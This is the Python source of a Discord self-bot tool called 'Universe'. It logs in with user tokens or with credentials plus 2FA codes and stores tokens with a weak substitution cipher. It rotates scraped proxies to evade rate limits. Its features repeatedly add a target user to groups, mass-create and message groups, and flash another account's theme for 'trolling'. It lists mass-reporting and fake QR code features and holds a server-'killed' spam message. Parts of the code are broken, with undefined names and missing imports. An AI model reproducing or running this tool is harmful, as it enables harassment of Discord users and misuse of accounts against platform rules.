import os
from os import system
try:
    import pygame
except:
    os.system('pip install pygame')
try:
    import colorama
    from colorama import *
except:
    os.system('pip install colorama')
try:
    import time
    from time import sleep
except:
    os.system('pip install time')
try:
    import pycenter
    from pycenter import center
except:
    os.system('pip install pycenter')
try:
    import getpass
except:
    os.system('pip install getpass')
try:
    import pypresence
    from pypresence import Presence
except:
    os.system('pip install pypresence')
try:
    import random
except:
    os.system('pip install random')
try:
    import re
    from re import findall
except:
    os.system('pip install re')
try:
    import json
    from json import loads, dumps
except:
    os.system('pip install json')
try:
    import requests
except:
    os.system('pip install requests')
try:
    import threading
    from threading import Thread
except:
    os.system('pip install threading')
try:
    import base64
    from base64 import b16decode, b32decode, b64decode
except:
    os.system('pip install base64')
try:
    import selenium
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
except:
    os.system('pip install selenium')
try:
    import PIL
    from PIL import Image
except:
    os.system('pip install PIL')
try:
    import bs4
    from bs4 import BeautifulSoup as bs4
except:
    os.system('pip install bs4')
try:
    import pyperclip
except:
    os.system('pip install pyperclip')
try:
    import pyautogui
except:
    os.system('pip install pyautogui')
try:
    import os.path
except:
    os.system('pip install os.path')
try:
    import sys
    from sys import argv
except:
    os.system('pip install sys')
try:
    import datetime
    from datetime import datetime
    from datetime import date
except:
    os.system('pip install datetime')
try:
    import dhooks
    from dhooks import Webhook
except:
    os.system('pip install dhhoks')
try:
    import io
except:
    os.system('pip install io')
try:
    import urllib
    import urllib.request
    from urllib.request import urlopen
except:
    os.system('pip install urllib')
try:
    import gtts
    from gtts import gTTS
except:
    os.system('pip install gtts')
try:
    import asyncio
except:
    os.system('pip install asyncio')
try:
    import webbrowser
except:
    os.system('pip install webbrowser')
try:
    import functools
except:
    os.system('pip install functools')
try:
    import ctypes
    from ctypes import windll
except:
    os.system('pip install ctypes')
try:
    from urllib import parse, request
    import urllib.parse
except:
    os.system('pip install urllib')
try:
    import string
except:
    os.system('pip install string')
try:
    import aiohttp
except:
    os.system('pip install aiohttp')
try:
    import discord
    from discord.ext import commands
    from discord.utils import get
except:
    os.system('pip install discord')
try:
    import numpy
except:
    os.system('pip install numpy')

def ff():
    # Resolution Of Console
    os.system('mode 150,30')

def pp():
    # Pause The Console
    os.system('pause >nul')

def cs():
    # Know If Linux Or Windows And Reset
    if sys.platform == "linux":
        os.system('clear')
    else:
        os.system('cls')

def cts():
    # Reset Console
    time.sleep(0.5)
    cs()
cts()

# Current Time Variable #
t = time.localtime()
current_time = time.strftime("%H:%M:%S", t)
#########################

# Remove Errors #
debugmode = False
if debugmode == True:
    class DevNull:
        def write(self, msg):
            pass
    sys.stderr = DevNull()
#########################

def TokonPrint(text):
    print(f'{current_time} {Fore.RESET}| {Fore.BLUE}[{Fore.RESET}¤{Fore.LIGHTBLUE_EX}] {Fore.RESET}{text}')

def TokonError(text):
    print(f'{current_time} {Fore.RESET}| {Fore.RED}[{Fore.RESET}¤{Fore.RED}] {Fore.RESET}{text}')

def TokonEvent(text):
    print(f'{current_time} {Fore.RESET}| {Fore.YELLOW}[{Fore.RESET}¤{Fore.YELLOW}] {Fore.RESET}{text}')

TokonInput = f"{current_time} {Fore.RESET}| {Fore.BLUE}[{Fore.RESET}¤{Fore.LIGHTBLUE_EX}] {Fore.RESET}"

if os.path.isfile("St/e1/Progress/cookie2.txt"):
    os.remove('St/e1/Progress/cookie2.txt')

cts()

with open('St/e7/config.json') as f:
    config = json.load(f)
with open('St/e5/config/music.json') as f:
    musicconfig = json.load(f)
with open('St/e2/config.json') as f:
    modifconfig = json.load(f)
with open('St/e8/log2.txt', 'r') as f:
    idlog = f.read()

premium_link = requests.get("https://pastebin.com/raw/xB93nUKA").text
premium_keys = json.loads(premium_link)
premium_status = premium_keys.get(f'status_{idlog}')
premium_saveid = premium_keys.get(f'id_{idlog}')

music = musicconfig.get("music")


def proxy_scrape():
    proxieslog = []
    startTim = time.time()
    temp = os.getenv("temp")+"\\proxiesuniverse"
    TokonPrint('Getting Proxies !')

    def fetchProxies(url, custom_regex):
        global proxylist
        try:
            proxylist = requests.get(url, timeout=5).text
        except Exception:
            pass
        finally:
            proxylist = proxylist.replace('null', '')
        #get the proxies from all the sites with the custom regex
        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
        for proxy in re.findall(re.compile(custom_regex), proxylist):
            proxieslog.append(f"{proxy[0]}:{proxy[1]}")

    #all urls
    proxysources = [
        ["http://spys.me/proxy.txt","%ip%:%port% "],
        ["http://www.httptunnel.ge/ProxyListForFree.aspx"," target=\"_new\">%ip%:%port%</a>"],
        ["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json", "\"ip\":\"%ip%\",\"port\":\"%port%\","],
        ["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list", '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
        ["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt", '%ip%:%port% (.*?){2}-.-S \\+'],
        ["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt", '%ip%", "type": "http", "port": %port%'],
        ["https://www.us-proxy.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://free-proxy-list.net/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://www.sslproxies.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=6000&country=all&ssl=yes&anonymity=all", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
        ["https://proxylist.icu/proxy/", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
        ["https://www.hide-my-ip.com/proxylist.shtml", '"i":"%ip%","p":"%port%",'],
        ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json", '"ip": "%ip%",\n.*?"port": "%port%",']
    ]
    threads = []
    for url in proxysources:
        #send them out in threads
        t = threading.Thread(target=fetchProxies, args=(url[0], url[1]))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    proxies = list(set(proxieslog))
    with open(temp, "w") as f:
        for proxy in proxies:
            #create the same proxy 7-10 times to avoid ratelimit when using other options
            for i in range(random.randint(7, 10)):
                f.write(f"{proxy}\n")

def proxy():
    temp = os.getenv("temp")+"\\proxiesuniverse"
    #if the file size is empty
    if os.stat(temp).st_size == 0:
        proxy_scrape()
    proxies = open(temp).read().split('\n')
    proxy = proxies[0]

    with open(temp, 'r+') as fp:
        #read all lines
        lines = fp.readlines()
        #get the first line
        fp.seek(0)
        #remove the proxy
        fp.truncate()
        fp.writelines(lines[1:])
    return proxy

proxy_scrape()

def Encode_Token(tok):
    encoded = ""
    for char in tok:
        if char == "a":
            encoded += "#"
        if char == "A":
            encoded += "~"
        if char == "b":
            encoded += "*"
        if char == "B":
            encoded += "^"
        if char == "c":
            encoded += "&"
        if char == "C":
            encoded += "é"
        if char == "d":
            encoded += '"'
        if char == "D":
            encoded += "'"
        if char == "e":
            encoded += "{"
        if char == "E":
            encoded += "("
        if char == "f":
            encoded += "["
        if char == "F":
            encoded += "-"
        if char == "g":
            encoded += "|"
        if char == "G":
            encoded += "è"
        if char == "h":
            encoded += "`"
        if char == "H":
            encoded += "_"
        if char == "i":
            encoded += "ç"
        if char == "I":
            encoded += "à"
        if char == "j":
            encoded += "@"
        if char == "J":
            encoded += ")"
        if char == "k":
            encoded += "°"
        if char == "K":
            encoded += "]"
        if char == "l":
            encoded += "="
        if char == "L":
            encoded += "+"
        if char == "m":
            encoded += "}"
        if char == "M":
            encoded += "$"
        if char == "n":
            encoded += "¤"
        if char == "N":
            encoded += "a"
        if char == "o":
            encoded += "A"
        if char == "O":
            encoded += "b"
        if char == "p":
            encoded += "B"
        if char == "P":
            encoded += "c"
        if char == "q":
            encoded += "C"
        if char == "Q":
            encoded += "d"
        if char == "r":
            encoded += "D"
        if char == "R":
            encoded += "e"
        if char == "s":
            encoded += "E"
        if char == "S":
            encoded += "f"
        if char == "t":
            encoded += "F"
        if char == "T":
            encoded += "g"
        if char == "u":
            encoded += "G"
        if char == "U":
            encoded += "h"
        if char == "v":
            encoded += "H"
        if char == "V":
            encoded += "i"
        if char == "w":
            encoded += "I"
        if char == "W":
            encoded += "j"
        if char == "x":
            encoded += "J"
        if char == "X":
            encoded += "k"
        if char == "y":
            encoded += "K"
        if char == "Y":
            encoded += "l"
        if char == "z":
            encoded += "L"
        if char == "Z":
            encoded += "M"
        if char == " ":
            encoded += ","
        if char == "1":
            encoded += "0"
        if char == "2":
            encoded += "9"
        if char == "3":
            encoded += "8"
        if char == "4":
            encoded += "7"
        if char == "5":
            encoded += "6"
        if char == "6":
            encoded += "5"
        if char == "7":
            encoded += "4"
        if char == "8":
            encoded += "3"
        if char == "9":
            encoded += "2"
        if char == "0":
            encoded += "1"
        if char == "&":
            encoded += "N"
        if char == "é":
            encoded += "o"
        if char == "-":
            encoded += "O"
        if char == "è":
            encoded += "p"
        if char == "_":
            encoded += "P"
        if char == 'ç':
            encoded += "Q"
        if char == 'à':
            encoded += "q"
        if char == ',':
            encoded += "R"
        if char == '.':
            encoded += "r"
    with open('St/e8/log.txt', 'w') as ff:
        ff.write(encoded)


def richpresence():
    rpc = Presence(899312186822893668, pipe=0)
    rpc.connect()
    rpc.update(state="Discord Client", details=f"#1 Best Tool", large_image='logo',
               buttons=[{"label": "Website", "url": f"https://tokon.site.xyz"},
                        {"label": "Discord", "url": f"https://tokon.site.xyz/discord"}])
richpresence()
# Token variable
def decode(_token):
    arg = open('St/e8/log.txt')
    argument = arg.read()
    argum = ""
    for char in argument:
        if char == "#":
            argum += "a"
        if char == "~":
            argum += "A"
        if char == "*":
            argum += "b"
        if char == "^":
            argum += "B"
        if char == "&":
            argum += "c"
        if char == "é":
            argum += "C"
        if char == '"':
            argum += "d"
        if char == "'":
            argum += "D"
        if char == "{":
            argum += "e"
        if char == "(":
            argum += "E"
        if char == "[":
            argum += "f"
        if char == "-":
            argum += "F"
        if char == "|":
            argum += "g"
        if char == "è":
            argum += "G"
        if char == "`":
            argum += "h"
        if char == "_":
            argum += "H"
        if char == "ç":
            argum += "i"
        if char == "à":
            argum += "I"
        if char == "@":
            argum += "j"
        if char == ")":
            argum += "J"
        if char == "°":
            argum += "k"
        if char == "]":
            argum += "K"
        if char == "=":
            argum += "l"
        if char == "+":
            argum += "L"
        if char == "}":
            argum += "m"
        if char == "$":
            argum += "M"
        if char == "¤":
            argum += "n"
        if char == "a":
            argum += "N"
        if char == "A":
            argum += "o"
        if char == "b":
            argum += "O"
        if char == "B":
            argum += "p"
        if char == "c":
            argum += "P"
        if char == "C":
            argum += "q"
        if char == "d":
            argum += "Q"
        if char == "D":
            argum += "r"
        if char == "e":
            argum += "R"
        if char == "E":
            argum += "s"
        if char == "f":
            argum += "S"
        if char == "F":
            argum += "t"
        if char == "g":
            argum += "T"
        if char == "G":
            argum += "u"
        if char == "h":
            argum += "U"
        if char == "H":
            argum += "v"
        if char == "i":
            argum += "V"
        if char == "I":
            argum += "w"
        if char == "j":
            argum += "W"
        if char == "J":
            argum += "x"
        if char == "k":
            argum += "X"
        if char == "K":
            argum += "y"
        if char == "l":
            argum += "Y"
        if char == "L":
            argum += "z"
        if char == "M":
            argum += "Z"
        if char == ",":
            argum += " "
        if char == "0":
            argum += "1"
        if char == "9":
            argum += "2"
        if char == "8":
            argum += "3"
        if char == "7":
            argum += "4"
        if char == "6":
            argum += "5"
        if char == "5":
            argum += "6"
        if char == "4":
            argum += "7"
        if char == "3":
            argum += "8"
        if char == "2":
            argum += "9"
        if char == "1":
            argum += "0"
        if char == "N":
            argum += "&"
        if char == "o":
            argum += "é"
        if char == "O":
            argum += "-"
        if char == "p":
            argum += "è"
        if char == "P":
            argum += "_"
        if char == "Q":
            argum += 'ç'
        if char == "q":
            argum += 'à'
        if char == "R":
            argum += ','
        if char == "r":
            argum += '.'
    _token = argum
    return _token

token = decode('')

s = requests.get("https://pastebin.com/raw/wUCUbqPj").text
ss = json.loads(s)

version = ss.get('version')
discordlink = ss.get('discord')



Tokon = discord.Client()
prefix = config.get('prefix')
Tokon = commands.Bot(description='Tokon', command_prefix=prefix, self_bot=True)
# Kill CMD Category
SPAM_CHANNEL = ["tokon.site.xyz", "【🐬】Killed"]
SPAM_MESSAGE = """
||@here||\n
\n
\n
\n   This Server Killed By Universe
\n   
\n     https://tokon.site.xyz
"""
# Others Variables
urloflogo = "https://cdn.discordapp.com/attachments/862026461564108841/896110250812379136/image0.png"
autoselfbotstatus = "off"
os.system(f'title 𝙐𝙣𝙞𝙫𝙚𝙧𝙨𝙚')
#Premium
premiumstatus = "Free Version"
#Connect Music
music = musicconfig.get('music')
if music == "on":
    musicstatus = "on"
    pygame.mixer.init()
    my_sound = pygame.mixer.Sound("St\e5\playlist\sample.mp3")
    my_sound.set_volume(0.1)
    my_sound.play(1000)
#Connect AutoSelfbot
autoselfbot = modifconfig.get('autoselfbot')
if autoselfbot == "on":
    autoselfbotstatus == "on"
#Connect Version
codeofverif = "v2:3e2"
def check_version():
    if not version == codeofverif:
        TokonPrint('You are using old Universe.')
        cs()
        TokonPrint('Updating...')
        thelink = requests.get("https://raw.githubusercontent.com/DaFrenchTokio/Universe/main/api_1").text
        getlink = json.loads(pr)
        if os.path.basename(sys.argv[0]).endswith("exe"):
            url_file_exe = getlink('url_file_exe')
            date_file_exe = getlink('date_file_exe')
            source = requests.get(url_file_exe)
            with open("Universev2.zip", 'wb') as zipfile:
                zipfile.write(source.content)
            with ZipFile("Universev2.zip", 'r') as filezip:
                filezip.extractall()
            os.remove("Universev2.zip")
            cwd = os.getcwd() + '\\Universev2'
            shutil.copytree(cwd, os.getcwd(), dirs_exist_ok=True)
            shutil.rmtree(cwd)
            TokonPrint(f"Update Finished - Date Of Updated File : {date_file_exe}")
            pp()
            quit()
        elif os.path.basename(sys.argv[0]).endswith("py"):
            # url
            url_file_py = getlink('url_file_py')
            date_file_py = getlink('date_file_py')
            source = requests.get(url_file_py)
            with open("Universev2.zip", 'wb') as zipfile:
                zipfile.write(source.content)
            with ZipFile("Universev2.zip", 'r') as filezip:
                filezip.extractall()
            os.remove("Universev2.zip")
            cwd = os.getcwd() + '\\Universev2'
            shutil.copytree(cwd, os.getcwd(), dirs_exist_ok=True)
            shutil.rmtree(cwd)
            TokonPrint(f"Update Finished - Date Of Updated File : {date_file_py}")
            pp()
            quit()
        else:
            TokonError('Py, Exe File not Detected, Make Sure To Not Rename File')
            TokonError('tokon.site.xyz/softwares, Download The New Universe')
            pp()
            quit()
check_version()
# Main
def logoprincipal():
    cs()
    g = f"\033[38;2;1;1;255m"
    gg = f"\033[38;2;1;1;220m"
    g_3 = f"\033[38;2;1;1;200m"
    g_4 = f"\033[38;2;1;1;180m"
    g_5 = f"\033[38;2;1;1;140m"
    g_6 = f"\033[38;2;1;1;125m"
    g_7 = f"\033[38;2;1;1;100m"
    r = f"{Fore.RESET}"
    l = f"""{r}{g}
                                                                                        
                                                                             
                                   {r}█████  █████           ███                                              
                                   {g}::{r}███  {g}{g}::{r}███           {g}:::                                               
                                    {g}:{r}███   {g}:{r}███ {r}████████  ████ █████ █████ ██████  ████████  █████   ██████ 
                                    {g_3}:{r}███   {g_3}:{r}███{g_3}::{r}███{g_3}::{r}███{g_3}::{r}███{g_3}::{r}███ {g_3}::{r}███ ███{g_3}::{r}███{g_3}::{r}███{g_3}::{r}██████{g_3}::   {r}███{g_3}::{r}███
                                    {g_4}:{r}███   {g_4}:{r}███ {g_4}:{r}███ {g_4}:{r}███ {g_4}:{r}███ {g_4}:{r}███  {g_4}:{r}███{g_4}:{r}███████  {g_4}:{r}███ {g_4}:::::{r}█████ {g_4}:{r}███████ 
                                    {g_5}:{r}███   {g_5}:{r}███ {g_5}:{r}███ {g_5}:{r}███ {g_5}:{r}███ {g_5}::{r}███ ███ {g_5}:{r}███{g_5}:::   :{r}███     {g_5}::::{r}███{g_5}:{r}███{g_5}:::  
                                    {g_6}::{r}████████  ████ ██████████ {g_6}::{r}█████  {g_6}::{r}██████  █████    ██████ {g_6}::{r}██████ 
                                     {g_7}::::::::  :::: ::::::::::   :::::    ::::::  :::::    ::::::   ::::::{Fore.RESET}                             
                                                                         
{r}──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                                                                         
                                                                         
    """
    print(l)

def method():
    cs()
    logoprincipal()
    g = f"\033[38;2;1;1;255m"
    r = f"{Fore.RESET}"
    if os.path.isfile("St/e1/Progress/cookie1.txt"):
        print(center('[1] Stay With Same Token, [2] Change Token'))
        changer = input(f'{TokonInput}Choice : ')
        if changer == "1":
            cs()
            logoprincipal()
        if changer == "2":
            os.remove('St/e1/Progress/cookie1.txt')
            os.remove('St/e4/injection.log')
            quit()
        if not changer == "2" and not changer == "1":
            logoprincipal()
            method()
    if not os.path.isfile("St/e1/Progress/cookie1.txt"):
        if not os.path.isfile("St/e4/injection.log"):
            injection = input(f'{TokonInput}Enter Your Token For Inject: ')
            Premium = discord.Client()
            @Premium.event
            async def on_connect():
                rf = open('St/e8/log2.txt', 'a')
                rf.write(str(Premium.user.id))
                with open('St/e4/injection.log', 'w') as ff:
                    ff.write('Injected')
                    ff.close()
                TokonPrint('Token Injected, Please Restart !')
                time.sleep(5)
                quit()
            def Init():
                try:
                    Premium.run(injection, bot=False)
                except discord.errors.LoginFailure:
                    while True:
                        email = str(input(f"{TokonInput}E-mail: "))
                        password = str(input(f"{TokonInput}Password: "))

                        payload = {
                            "email": email,
                            "password": password
                        }

                        r = requests.post('https://discord.com/api/v9/auth/login', json=payload).json()
                        if "captcha_key" in r:
                            TokonError("A captcha is requested, the email entered is invalid or has been attempted too many times on connection. Rewrite your information.")
                            time.sleep(1)
                        elif "errors" in r:
                            TokonError("An error has occurred. Rewrite your information.")
                        elif r["token"] == None:
                            break
                        else:
                            TokonPrint("Token: " + r["token"])
                            pp()
                            exit()
                    while True:
                        if r["token"] == None:
                            print("-----------2FA Authentication-----------")
                            code = input(Fore.RED + "Enter the 2FA authentication code: ")
                            mfa_payload = {
                                "code": code,
                                "ticket": r["ticket"]
                            }
                            r2 = requests.post('https://discord.com/api/v9/auth/mfa/totp', json=mfa_payload).json()
                            if "message" in r2:
                                TokonError("The 2FA authentication code is incorrect. Rewrite the code.")
                                pp()
                            else:
                                TokonPrint("Token: " + r2["token"])
                                pp()
                                exit()
            Init()
        else:
            f = open("St/e1/Progress/cookie1.txt", "w+")
            f.close()
            CCtoken = input(f'{TokonInput}Enter Your Token : ')
            save = input(f'{TokonInput}Want To Save Token (y/n): ')
            if save == "n":
                logoprincipal()
            if save == "y":
                Encode_Token(CCtoken)
                TokonPrint('Token Saved + Encoded')
                time.sleep(2)
                logoprincipal()
            if not save == "y" and not save == "n":
                logoprincipal()
                method()
def launch():
    logoprincipal()
    if not os.path.isfile("St/e1/Progress/cookie2.txt"):
        f = open("St/e1/Progress/cookie2.txt", "w+")
        f.close()
        method()
    if autoselfbotstatus == "on":
        cmd = "selfbot"
    if autoselfbotstatus == "off":
        cmd = input(f"{TokonInput}Enter The Command ~> ")
    if cmd == "menu":
        TokonPrint('discord')
        TokonPrint('music')
        TokonPrint('premium')
        TokonPrint('information')
        pp()
        launch()
    if cmd == "information":
        token = decode('')
        TokonPrint(f'Your Saved Token Is : {token}')
        pp()
        launch()
    if cmd == "exit":
        exit()
    if cmd == "premium":
        TokonPrint(f'unverifytoken')
        TokonPrint(f'tokeninfo')
        TokonPrint(f'massreport')
        TokonPrint(f'fakeqrcode')
        TokonPrint(f'autologin')
        TokonPrint(f'flashtheme')
        TokonPrint(f'purgedm')
        TokonPrint(f'massgroup')
        TokonPrint(f'linkvertise')
        pp()
        launch()
    if cmd == "linkvertise":
       if idlog == premium_saveid and premium_status == "exact":
           headers = {
               "Host": "bypass.bot.nu",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
               "Accept": "*/*",
               "Accept-Language": "en-US,en;q=0.5",
               "Accept-Encoding": "gzip, deflate, br",
               "Referer": "https://bypass.bot.nu/",
               "Connection": "keep-alive",
           }
           link = input(f'{TokonInput}Enter The Linkvertise Link : ')
           try:
               data = requests.get(f"https://bypass.bot.nu/bypass2?url={link}", headers=headers)
               link = data.json()["destination"]
               TokonPrint(f"Real Link :{Fore.GREEN} {link}{Fore.RESET}")
           except:
               TokonError(f"An unexpected error occurred")
       else:
           TokonPrint('You Are Not Premium')
       pp()
       launch()
    if cmd == "massgroup":
        if idlog == premium_saveid and premium_status == "exact":
            def massgroupmenu():
                thread1 = []
                p = []
                cs()
                logoprincipal()
                g = f"\033[38;2;1;1;255m"
                r = f"{Fore.RESET}"
                print(f'''
             
                {g}[{r}01{g}] {r}Create Groups
                {g}[{r}02{g}] {r}Add User From Groups
                {g}[{r}03{g}] {r}Remove User From Groups
                {g}[{r}04{g}] {r}Rechange Icon Of Groups                
                {g}[{r}05{g}] {r}Rename Groups       
                {g}[{r}06{g}] {r}Scrape All Groups
                {g}[{r}07{g}] {r}Leave All Groups   
                {g}[{r}08{g}] {r}Send Msg (bug)
                {g}[{r}09{g}] {r}Scrape Proxies
                {g}[{r}10{g}] {r}Reset Scraped Groups
                {g}[{r}11{g}] {r}Exit
   
                            ''')

                command = input(f'{TokonInput}Enter Number : ')
                if command == "1":
                    token = decode('')
                    group = input(f'{TokonInput}Group Names: ')
                    manygroup = int(input(f'{TokonInput}How Many Groups ( 10 max ): '))
                    for i in range(manygroup):
                        try:
                            rr = requests.post('https://discord.com/api/v9/users/@me/channels', headers={'Authorization': token}, json={"recipients": []})
                            jsr = json.loads(rr.content)
                            groupID = jsr['id']
                            time.sleep(0.5)
                            r1 = requests.patch(f'https://discord.com/api/v9/channels/{groupID}', headers={'Authorization': token}, json={'name': group})
                            if r1.status_code == 200:
                                TokonPrint('Group created')
                            with open("St/e9/groups.txt", "a") as groupID:
                                groupID.write(jsr['id'] + '\n')
                        except:
                            TokonError(f'RateLimited for {jsr["retry_after"]} seconds')
                            time.sleep(2)
                    massgroupmenu()
                if command == "2":
                    token = decode('')
                    def add():
                        global count
                        headers = {"Authorization": token}
                        url = f'https://discord.com/api/v9/channels/{gcs}/recipients/{userid}'
                        response = requests.put(url, headers=headers, proxies={"http": f'{proxy()}'})
                        json_resp = json.loads(response.content)
                        if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
                            TokonPrint(f"User Added : {gcs}")
                        elif response.status_code == 429:
                            TokonError(f"User Not Added (wait:{json_resp['retry_after']})")
                            time.sleep(2.5)
                        else:
                            TokonError(f'User NOT Added to Group => HTTP Error: {response.status_code}')

                    userid = input(f'{TokonInput}Target ID : ')
                    for gcs in p:
                        thread = threading.Thread(target=add, args=(), daemon=True)
                        thread.start()
                        thread1.append(thread)
                    for thread in thread1:
                        thread.join()
                    massgroupmenu()
                if command == "3":
                    token = decode('')
                    def remove():
                        global count
                        headers = {"Authorization": token,
                                   "Content-Type": "application/json"}
                        url = f'https://discord.com/api/v9/channels/{gcs}/recipients/{userid}'
                        try:
                            requests.delete(url, headers=headers, proxies={"http": f'{proxy()}'})
                        except Exception as e:
                            TokonError(f'Failed to remove user from {gcs}')
                    userid = input(f"{TokonInput}Target ID : ")
                    for gcs in p:
                        thread = threading.Thread(target=remove, args=(), daemon=True)
                        thread.start()
                        thread1.append(thread)
                    for thread in thread1:
                        thread.join()
                    massgroupmenu()
                if command == "4":
                    token = decode('')
                    icondir = input(f'{TokonInput}Enter Icon File Directory : ')
                    icon = base64.b64encode(open(str(icondir).replace('"', ''), 'rb').read()).decode('utf-8')
                    icon = f'data:image/png;base64,%s' % icon
                    def reicon():
                        headers = {"Authorization": token, "Content-Type": "application/json"}
                        url = f'https://discord.com/api/v9/channels/{gcs}'
                        payload = {"icon": f'{icon}'}
                        try:
                            requests.patch(url=url, headers=headers, json=payload, proxies={"http": f'{proxy()}'})
                        except Exception as e:
                            TokonError(f'Failed to rename {gcs}')

                    for gcs in p:
                        thread = threading.Thread(target=reicon, args=(), daemon=True)
                        thread.start()
                        thread1.append(thread)
                    for thread in thread1:
                        thread.join()
                    massgroupmenu()
                if command == "5":
                    token = decode('')
                    def rename():
                        headers = {"Authorization": token, "Content-Type": "application/json"}
                        url = f'https://discord.com/api/v9/channels/{gcs}'
                        payload = {"name": f'{name}'}
                        try:
                            requests.patch(url=url, headers=headers, json=payload,
                                           proxies={"http": f'{proxy()}'})
                        except Exception as e:
                            TokonError(f"Failed to rename {gcs}")

                    name = input(f"{TokonInput}Name : ")
                    for gcs in p:
                        thread = threading.Thread(target=rename, args=(), daemon=True)
                        thread.start()
                        thread1.append(thread)
                    for thread in thread1:
                        thread.join()
                    massgroupmenu()
                if command == "6":
                    token = decode('')
                    client = discord.Client()
                    intents = discord.Intents.all()
                    client = commands.Bot(command_prefix="l", case_insensitive=False, self_bot=True, intents=intents)

                    @client.event
                    async def on_ready():
                        await scrape()

                    @client.event
                    async def scrape():
                        number = 0
                        if os.path.isfile("St/e9/groups.txt"):
                            os.remove('St/e9/groups.txt')
                        with open('St/e9/groups.txt', 'a') as txt:
                            for channel in client.private_channels:
                                if isinstance(channel, discord.GroupChannel):
                                    txt.write(str(channel.id) + '\n')
                                    TokonPrint('Scraped 1 Group !')
                                    number += 1
                                TokonPrint(f'Scraped {number}')
                        massgroupmenu()
                    client.run(token, bot=False)
                if command == "7":
                    token = decode('')
                    client = discord.Client()

                    @client.event
                    async def on_ready():
                        for channel in client.private_channels:
                            if isinstance(channel, discord.GroupChannel):
                                await channel.leave()
                                TokonPrint("Left a group: " + str(channel.id))  # Print
                        await client.close()
                    client.run(token, bot=False)
                    massgroupmenu()
                if command == "8":
                    token = decode('')
                    def sendmsg():
                        headers = {"Authorization": token}
                        url = f'https://discord.com/api/v9/channels/{gcs}/messages'
                        payload = {"content": message, "nonce": gcs}
                        try:
                            requests.post(url=url, headers=headers, json=payload, proxies={"http": f'{proxy()}'})
                            print(f'Sent message to {gcs}')
                        except Exception as e:
                            print(f'Failed to send message to {gcs}')
                    message = input(f"{TokonInput}Message : ")
                    for gcs in p:
                        thread = threading.Thread(target=sendmsg, args=(), daemon=True)
                        thread.start()
                        thread1.append(thread)
                    for thread in thread1:
                        thread.join()
                    massgroupmenu()
                if command == "9":
                    f = open("St/e9/proxies.txt", 'wb')
                    r1 = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all")
                    f.write(r1.content)
                    f.close()
                    TokonPrint("Scraped Proxies")
                    time.sleep(1.75)
                    massgroupmenu()
                if command == "10":
                    if os.path.isfile("St/e9/groups.txt"):
                        os.remove('St/e9/groups.txt')
                        TokonPrint('Groups ID reseted !')
                    else:
                        TokonError('No Groups ID !')
                    time.sleep(1.75)
                    massgroupmenu()
                if command == "11":
                    launch()
            massgroupmenu()
    if cmd == "flashtheme":
        if idlog == premium_saveid and premium_status == "exact":
            def flashtheme():
                amm = 0
                logoprincipal()
                rr = f'{Fore.RESET}'
                token = input(f"""{TokonInput}Enter the token of the account you want to Cycle Color theme : """)
                headers = {'Authorization': token, 'Content-Type': 'application/json'}
                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                if r.status_code == 200:
                    TokonPrint(f"""Enter the number of cycles : """)
                    amount = int(input(f"""{TokonInput}Amount: """))
                    print()
                    modes = cycle(["light", "dark"])
                    cs()
                    for i in range(amount):
                        amm += 1
                        os.system(f'title 𝙐𝙣𝙞𝙫𝙚𝙧𝙨𝙚 - FlashTheme Has Been Changed : {amm}')
                        time.sleep(0.12)
                        setting = {'theme': next(modes)}
                        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=setting)
                    cs()
                    logoprincipal()
                    TokonPrint(f"""Finished Trolling""")
                    pp()
                    user = getpass.getuser()
                    os.system(f'title 𝙐𝙣𝙞𝙫𝙚𝙧𝙨𝙚')
                    launch()
                else:
                    logoprincipal()
                    TokonPrint(f"""Invalid token""")
                    pp()
                    launch()
            flashtheme()

    if cmd == "autologin":
        if idlog == premium_saveid and premium_status == "exact":
            logoprincipal()
            _token = str(input(f"{TokonInput}Enter The Token: "))
            def login(entertoken):
                s = Service('St/e6/chromedriver.exe')
                driver = webdriver.Chrome(service=s)
                driver.maximize_window()
                driver.get('https://discord.com/login')
